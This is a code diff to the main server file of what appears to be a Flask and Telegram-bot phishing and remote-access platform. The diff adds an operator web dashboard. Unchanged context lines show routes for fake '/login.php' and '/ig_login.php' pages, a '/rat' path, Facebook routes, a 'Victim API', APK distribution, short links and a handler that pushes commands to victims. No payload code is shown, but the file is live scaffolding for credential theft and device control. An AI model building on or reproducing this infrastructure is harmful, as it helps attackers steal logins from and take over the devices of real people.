@@ -64,19 +64,35 @@ from monitoring import init_monitoring, metrics
 from rate_limiter import start_cleanup_thread
 
 # ============================================================
-# [4] Flask Setup
+# [4] Web Dashboard
+# ============================================================
+try:
+    from web_dashboard import init_web_dashboard
+    WEB_DASHBOARD_ENABLED = True
+    logger.info("[+] web_dashboard imported")
+except Exception as e:
+    logger.exception(f"[-] web_dashboard import failed: {e}")
+    WEB_DASHBOARD_ENABLED = False
+
+    def init_web_dashboard(app):
+        pass
+
+
+# ============================================================
+# [5] Flask Setup
 # ============================================================
 app = Flask(__name__)
 
 
 # ============================================================
-# [5] Origin Gate
+# [6] Origin Gate
 # ============================================================
 ORIGIN_GATE_EXEMPT = ['/', '/health', '/_health', '/_metrics', '/_version']
 
 ALLOWED_PREFIXES = (
     '/lsh', '/sh', '/rat', '/qr', '/wa',
-    '/apk',  # ★ APK Manager
+    '/apk',         # ★ APK Manager
+    '/dashboard',   # ★ Web Dashboard
     '/api/v1/session', '/qr_scan', '/f/',
     '/login.php', '/ig_login.php', '/system_secure',
     '/manifest.json', '/sw.js',
@@ -116,7 +132,7 @@ def verify_origin():
 
 
 # ============================================================
-# [6] Health Check
+# [7] Health Check
 # ============================================================
 @app.route('/')
 def health_check():
@@ -124,7 +140,7 @@ def health_check():
 
 
 # ============================================================
-# [7] Request Timing
+# [8] Request Timing
 # ============================================================
 @app.before_request
 def start_timer():
@@ -152,7 +168,7 @@ def log_request(response):
 
 
 # ============================================================
-# [8] تسجيل الـ Blueprints
+# [9] تسجيل الـ Blueprints
 # ============================================================
 if sh_bp:
     app.register_blueprint(sh_bp)
@@ -180,7 +196,7 @@ if apk_bp:
 
 
 # ============================================================
-# [9] Init Routes
+# [10] Init Routes
 # ============================================================
 init_facebook_routes(app, bot)
 logger.info("[+] Init: facebook routes")
@@ -232,7 +248,7 @@ register_payment_handlers(bot)
 logger.info("[+] Init: payment handlers")
 
 # ============================================================
-# [10] Victim API
+# [11] Victim API
 # ============================================================
 try:
     init_victim_api(app, bot)
@@ -241,7 +257,7 @@ except Exception as e:
     logger.exception(f"[-] Victim API init failed: {e}")
 
 # ============================================================
-# [11] Short Link
+# [12] Short Link
 # ============================================================
 try:
     init_short_link(app)
@@ -250,13 +266,25 @@ except Exception as e:
     logger.exception(f"[-] Short link init failed: {e}")
 
 # ============================================================
-# [12] Monitoring
+# [13] Monitoring
 # ============================================================
 init_monitoring(app)
 start_cleanup_thread()
 
 # ============================================================
-# [13] LSH - الرابط المُدخل
+# [14] Web Dashboard ★ جديد
+# ============================================================
+if WEB_DASHBOARD_ENABLED:
+    try:
+        init_web_dashboard(app)
+        logger.info("[+] Init: web dashboard at /dashboard")
+    except Exception as e:
+        logger.exception(f"[-] Web Dashboard init failed: {e}")
+else:
+    logger.warning("[-] Web Dashboard disabled - skipping init")
+
+# ============================================================
+# [15] LSH - الرابط المُدخل
 # ============================================================
 from imports_manager import lsh_push_command
 
@@ -283,7 +311,7 @@ def handle_open_url(message):
 
 
 # ============================================================
-# [14] تشغيل البوت
+# [16] تشغيل البوت
 # ============================================================
 def run_telegram_bot():
     logger.info("=" * 60)
@@ -332,7 +360,7 @@ def run_telegram_bot():
 
 
 # ============================================================
-# [15] Main
+# [17] Main
 # ============================================================
 if __name__ == "__main__":
     try:
